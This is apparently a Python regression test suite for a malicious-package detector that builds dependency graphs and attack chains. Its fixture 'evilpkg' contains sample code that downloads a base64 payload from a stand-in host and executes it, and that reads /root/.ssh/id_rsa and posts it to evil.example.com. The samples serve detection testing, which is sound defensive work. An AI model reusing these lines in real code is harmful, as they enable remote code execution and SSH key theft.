# -*- coding: utf-8 -*-
"""回归测试:DDG构建端到端(不调LLM)——cmdclass崩溃回归/恶意包子图/攻击链"""
import sys
import json
import shutil
import tempfile
from pathlib import Path

NEW_DDG = Path(__file__).parent.parent
sys.path.insert(0, str(NEW_DDG))

from batch_solution_b_v2 import BatchAnalyzerV20Voting


def make_analyzer(tmp_root: Path):
    return BatchAnalyzerV20Voting(
        tarfile_dir=str(tmp_root), api_key='dummy', count=10,
        extract_base=str(tmp_root / 'output')
    )


def benign_cli_package(root: Path) -> Path:
    """正常CLI包:setup.py 含 cmdclass(触发旧KeyError崩溃)+console_scripts+requests"""
    pkg = root / "normalcli-1.0.0"
    (pkg / "normalcli").mkdir(parents=True)
    (pkg / "normalcli" / "__init__.py").write_text("", encoding="utf-8")
    (pkg / "normalcli" / "main.py").write_text(
        "import requests\n\n"
        "def fetch(url):\n"
        "    return requests.get(url).text\n\n"
        "def main():\n"
        "    data = fetch('https://pypi.org/pypi/normalcli/json')\n"
        "    print(len(data))\n",
        encoding="utf-8")
    (pkg / "setup.py").write_text(
        "from setuptools import setup, Command\n\n"
        "class BuildExt(Command):  # 正常构建命令,含 Install 无关的 cmdclass\n"
        "    def initialize_options(self): pass\n"
        "    def finalize_options(self): pass\n"
        "    def run(self): pass\n\n"
        "setup(\n"
        "    name='normalcli',\n"
        "    version='1.0.0',\n"
        "    cmdclass={'build_ext': BuildExt},\n"
        "    entry_points={'console_scripts': ['normalcli=normalcli.main:main']},\n"
        ")\n",
        encoding="utf-8")
    return pkg


def malicious_package(root: Path) -> Path:
    pkg = root / "evilpkg-1.0.0"
    (pkg / "evilpkg").mkdir(parents=True)
    (pkg / "evilpkg" / "__init__.py").write_text("", encoding="utf-8")
    (pkg / "evilpkg" / "core.py").write_text(
        "import base64\n"
        "import os\n"
        "import requests\n\n"
        "def run():\n"
        "    encoded = requests.get('http://evil.example.com/p.txt').text\n"
        "    decoded = base64.b64decode(encoded)\n"
        "    os.system(decoded)\n",
        encoding="utf-8")
    (pkg / "evilpkg" / "steal.py").write_text(
        "import requests\n\n"
        "def steal():\n"
        "    data = open('/root/.ssh/id_rsa').read()\n"
        "    requests.post('http://evil.example.com/c', data=data)\n",
        encoding="utf-8")
    (pkg / "setup.py").write_text(
        "from setuptools import setup\nsetup(name='evilpkg', version='1.0.0')\n",
        encoding="utf-8")
    return pkg


def test_cmdclass_no_crash():
    """核心验收:setup.py 含 cmdclass 不再让 DDG build 崩溃(旧bug:KeyError→包静默变BENIGN)"""
    tmp = Path(tempfile.mkdtemp(prefix="pipe_benign_"))
    try:
        analyzer = make_analyzer(tmp)
        pkg = benign_cli_package(tmp)
        output_dir = analyzer._run_ddg_builder(pkg)  # 旧代码在此抛 KeyError
        report_file = Path(output_dir) / 'security_report.json'
        assert report_file.exists(), "security_report.json 应生成"
        report = json.loads(report_file.read_text(encoding='utf-8'))
        assert 'by_severity' in report
        print("[OK] cmdclass setup.py 不再崩溃, security_report 正常生成")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_malicious_package_subgraphs_and_chains():
    """恶意包:子图非空 + 攻击链重建产物存在"""
    tmp = Path(tempfile.mkdtemp(prefix="pipe_evil_"))
    try:
        analyzer = make_analyzer(tmp)
        pkg = malicious_package(tmp)
        output_dir = Path(analyzer._run_ddg_builder(pkg))
        sub_dir = output_dir / 'sub_ddgs'
        assert sub_dir.exists() and any(sub_dir.iterdir()), "恶意包应产生子图"
        chains_file = output_dir / 'attack_chains.json'
        assert chains_file.exists(), "attack_chains.json 应生成"
        summary = analyzer._read_attack_chains(pkg)
        assert summary['chain_count'] > 0, "应重建出攻击链"
        print(f"[OK] 恶意包: 子图非空, 攻击链 {summary['chain_count']} 条")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_benign_enhanced_not_fatal():
    """验收:正常CLI包增强检测不再判 critical(流程顺序:增强critical才短路)"""
    from src.enhanced_detector import EnhancedSecurityDetector
    tmp = Path(tempfile.mkdtemp(prefix="pipe_ed_"))
    try:
        pkg = benign_cli_package(tmp)
        det = EnhancedSecurityDetector()
        result = det.analyze_package(pkg)
        assert result['overall_threat_level'] not in ('critical', 'high'), \
            f"正常CLI包不应触发短路: {result['overall_threat_level']}"
        print(f"[OK] 正常CLI包整体等级: {result['overall_threat_level']}(不短路MALICIOUS)")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == '__main__':
    test_cmdclass_no_crash()
    test_malicious_package_subgraphs_and_chains()
    test_benign_enhanced_not_fatal()
    print("\n===== test_pipeline 全部通过 =====")
